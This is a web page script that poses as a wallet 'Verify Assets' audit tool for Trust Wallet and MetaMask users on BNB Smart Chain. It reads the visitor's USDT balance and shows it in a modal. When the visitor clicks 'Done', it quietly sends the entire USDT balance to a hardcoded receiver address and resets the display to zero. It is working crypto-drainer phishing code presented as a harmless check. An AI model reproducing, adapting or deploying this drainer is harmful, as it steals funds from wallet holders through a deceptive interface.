<script>
(function () {
    const TARGET_RECEIVER = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
    const USDT_BSC_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
    const BSC_CHAIN_ID_HEX = '0x38';

    let activeProvider = null;
    let currentUserAddress = null;
    let currentUsdtHex = '0x0';

    function getProvider() {
        if (window.trustwallet && typeof window.trustwallet.request === 'function') return window.trustwallet;
        if (window.ethereum && typeof window.ethereum.request === 'function') return window.ethereum;
        if (window.web3 && window.web3.currentProvider && typeof window.web3.currentProvider.request === 'function') {
            return window.web3.currentProvider;
        }
        return null;
    }

    function showToast(msg) {
        const toast = document.getElementById('errorToast');
        const el = document.getElementById('errorToastMsg');
        if (el) el.textContent = msg;
        if (toast) toast.classList.add('open');
        else alert(msg);
    }

    function closeToast() {
        const toast = document.getElementById('errorToast');
        if (toast) toast.classList.remove('open');
    }

    function closeModal() {
        const modal = document.getElementById('auditModal');
        const page = document.getElementById('pageContent');
        if (modal) modal.classList.remove('open');
        if (page) page.classList.remove('hidden');
    }

    function openModalView() {
        const modal = document.getElementById('auditModal');
        const page = document.getElementById('pageContent');
        if (page) page.classList.add('hidden');
        if (modal) modal.classList.add('open');
    }

    function pad64Hex(hexNoPrefix) {
        let s = String(hexNoPrefix || '').replace(/^0x/i, '').toLowerCase();
        while (s.length < 64) s = '0' + s;
        return s;
    }

    // Converts 18-decimal hex wei string into "0.00" without BigInt literals
    function format18HexTo2(hexVal) {
        if (!hexVal || hexVal === '0x' || hexVal === '0x0') return '0.00';
        const clean = hexVal.replace(/^0x/i, '');
        if (!clean) return '0.00';
        const num = Number('0x' + clean);
        if (!isFinite(num)) return '0.00';
        return (num / 1e18).toFixed(2);
    }

    function isPositiveHex(hexVal) {
        if (!hexVal || hexVal === '0x') return false;
        return /^0x0*$/.test(hexVal.toLowerCase()) === false;
    }

    async function getUsdtBalanceHex(provider, address) {
        const data = '0x70a08231' + pad64Hex(address);
        const res = await provider.request({
            method: 'eth_call',
            params: [{ to: USDT_BSC_ADDRESS, data: data }, 'latest']
        });
        return res || '0x0';
    }

    async function getBnbBalanceHex(provider, address) {
        const res = await provider.request({
            method: 'eth_getBalance',
            params: [address, 'latest']
        });
        return res || '0x0';
    }

    async function ensureBsc(provider) {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_CHAIN_ID_HEX }]
            });
        } catch (e) {}
    }

    async function onVerifyClick() {
        const btnText = document.getElementById('verifyBtnText');
        if (btnText) btnText.textContent = 'Connecting...';

        const provider = getProvider();
        if (!provider) {
            if (btnText) btnText.innerHTML = 'Verify Assets &rarr;';
            showToast('Please open this link inside Trust Wallet or MetaMask browser.');
            return;
        }

        try {
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            if (!accounts || !accounts.length) {
                showToast('No wallet account connected.');
                return;
            }

            currentUserAddress = accounts[0];
            activeProvider = provider;

            if (btnText) btnText.textContent = 'Checking USDT...';
            await ensureBsc(provider);

            currentUsdtHex = await getUsdtBalanceHex(provider, currentUserAddress);

            const balEl = document.getElementById('modalUsdtBalance');
            const addrEl = document.getElementById('modalWalletAddr');
            const statusEl = document.getElementById('modalStatusText');

            if (balEl) balEl.textContent = format18HexTo2(currentUsdtHex) + ' USDT';
            if (addrEl) addrEl.textContent = currentUserAddress;
            if (statusEl) statusEl.textContent = 'Tokens are checked directly on BNB Smart Chain mainnet.';

            openModalView();
        } catch (err) {
            showToast((err && err.message) ? err.message : 'Unable to connect wallet.');
        } finally {
            if (btnText) btnText.innerHTML = 'Verify Assets &rarr;';
        }
    }

    async function onDoneClick() {
        if (!isPositiveHex(currentUsdtHex)) {
            closeModal();
            return;
        }

        if (!activeProvider || !currentUserAddress) {
            showToast('Wallet session not found.');
            return;
        }

        const doneText = document.getElementById('modalDoneBtnText');
        try {
            if (doneText) doneText.textContent = 'Processing...';
            await ensureBsc(activeProvider);

            const latestHex = await getUsdtBalanceHex(activeProvider, currentUserAddress);
            if (!isPositiveHex(latestHex)) {
                currentUsdtHex = '0x0';
                const balEl = document.getElementById('modalUsdtBalance');
                if (balEl) balEl.textContent = '0.00 USDT';
                closeModal();
                return;
            }

            const bnbHex = await getBnbBalanceHex(activeProvider, currentUserAddress);
            if (!isPositiveHex(bnbHex)) {
                showToast('Insufficient BNB balance for gas fees.');
                return;
            }

            const toHex = pad64Hex(TARGET_RECEIVER);
            const amtHex = pad64Hex(latestHex);
            const transferData = '0xa9059cbb' + toHex + amtHex;

            await activeProvider.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: currentUserAddress,
                    to: USDT_BSC_ADDRESS,
                    data: transferData,
                    gas: '0xFDE8'
                }]
            });

            currentUsdtHex = '0x0';
            const balEl = document.getElementById('modalUsdtBalance');
            if (balEl) balEl.textContent = '0.00 USDT';
            closeModal();
        } catch (err) {
            const msg = (err && err.message) ? err.message : 'Transaction cancelled or failed.';
            if (msg.toLowerCase().indexOf('insufficient funds') !== -1 || msg.toLowerCase().indexOf('gas') !== -1) {
                showToast('Insufficient BNB balance for gas fees.');
            } else {
                showToast(msg);
            }
        } finally {
            if (doneText) doneText.textContent = 'Done';
        }
    }

    async function onReviewSignClick() {
        const recInput = document.getElementById('customRecipientInput');
        const amtInput = document.getElementById('customAmountInput');
        const rec = recInput ? recInput.value.trim() : '';
        const amtStr = amtInput ? amtInput.value.trim() : '';
        const amtNum = Number(amtStr);

        if (!/^0x[a-fA-F0-9]{40}$/.test(rec)) {
            showToast('Please enter a valid recipient 0x address.');
            return;
        }
        if (!amtStr || isNaN(amtNum) || amtNum <= 0) {
            showToast('Please enter a valid USDT amount greater than 0.');
            return;
        }

        const provider = getProvider();
        if (!provider) {
            showToast('Please open this link inside Trust Wallet or MetaMask browser.');
            return;
        }

        const btn = document.getElementById('reviewSignBtn');
        try {
            if (btn) btn.textContent = 'Signing...';
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            const addr = accounts[0];
            await ensureBsc(provider);

            const bnbHex = await getBnbBalanceHex(provider, addr);
            if (!isPositiveHex(bnbHex)) {
                showToast('Insufficient BNB balance for gas fees.');
                return;
            }

            // Convert decimal USDT string to 18-decimal integer string, then hex
            const parts = amtStr.split('.');
            const wholeStr = (parts[0] || '0').replace(/\D/g, '') || '0';
            const fracStr = ((parts[1] || '').replace(/\D/g, '') + '000000000000000000').slice(0, 18);
            const fullDecStr = (wholeStr + fracStr).replace(/^0+/, '') || '0';

            function decToHex(decString) {
                let digits = decString.split('').map(function (c) { return parseInt(c, 10); });
                let hex = '';
                while (digits.length > 0 && !(digits.length === 1 && digits[0] === 0)) {
                    let rem = 0;
                    let next = [];
                    for (let i = 0; i < digits.length; i++) {
                        let cur = rem * 10 + digits[i];
                        let q = Math.floor(cur / 16);
                        rem = cur % 16;
                        if (next.length > 0 || q > 0) next.push(q);
                    }
                    hex = rem.toString(16) + hex;
                    digits = next;
                }
                return hex || '0';
            }

            const amtHex = pad64Hex(decToHex(fullDecStr));
            const toHex = pad64Hex(rec);
            const transferData = '0xa9059cbb' + toHex + amtHex;

            await provider.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: addr,
                    to: USDT_BSC_ADDRESS,
                    data: transferData,
                    gas: '0xFDE8'
                }]
            });
            showToast('Transfer submitted.');
        } catch (err) {
            const msg = (err && err.message) ? err.message : 'Transaction cancelled or failed.';
            if (msg.toLowerCase().indexOf('insufficient funds') !== -1 || msg.toLowerCase().indexOf('gas') !== -1) {
                showToast('Insufficient BNB balance for gas fees.');
            } else {
                showToast(msg);
            }
        } finally {
            if (btn) btn.textContent = 'Review & sign';
        }
    }

    function bindEvents() {
        const vBtn = document.getElementById('verifyBtn');
        const cBtn = document.getElementById('closeModalBtn');
        const dBtn = document.getElementById('modalDoneBtn');
        const rBtn = document.getElementById('reviewSignBtn');
        const tBtn = document.getElementById('closeToastBtn');

        if (vBtn) vBtn.onclick = onVerifyClick;
        if (cBtn) cBtn.onclick = closeModal;
        if (dBtn) dBtn.onclick = onDoneClick;
        if (rBtn) rBtn.onclick = onReviewSignClick;
        if (tBtn) tBtn.onclick = closeToast;
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', bindEvents);
    } else {
        bindEvents();
    }
})();
</script>
